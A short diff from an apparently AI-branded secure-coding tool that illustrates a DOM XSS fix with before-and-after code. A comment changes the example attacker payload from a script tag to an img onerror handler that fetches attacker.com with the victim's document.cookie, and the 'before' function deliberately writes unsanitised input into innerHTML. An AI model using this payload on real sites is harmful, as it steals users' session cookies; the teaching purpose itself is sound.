@@ -2841,7 +2841,7 @@ def get_auth_token(user_id: str):
     beforeCode: `// ❌ VULNERABLE: Direct innerHTML injection
 function renderUserProfile(user) {
     const banner = document.getElementById("profile-header");
-    // Attacker payload: <script>fetch('http://attacker.com/steal?c=' + document.cookie)</script>
+    // Attacker payload: <img src=x onerror="fetch('http://attacker.com/steal?c=' + document.cookie)">
     banner.innerHTML = "<h1>Welcome, " + user.name + "</h1><p>" + user.bio + "</p>";
 }`,
     afterCode: `// ✅ SHIPCHECK AI FIX: DOM textContent & Sanitization
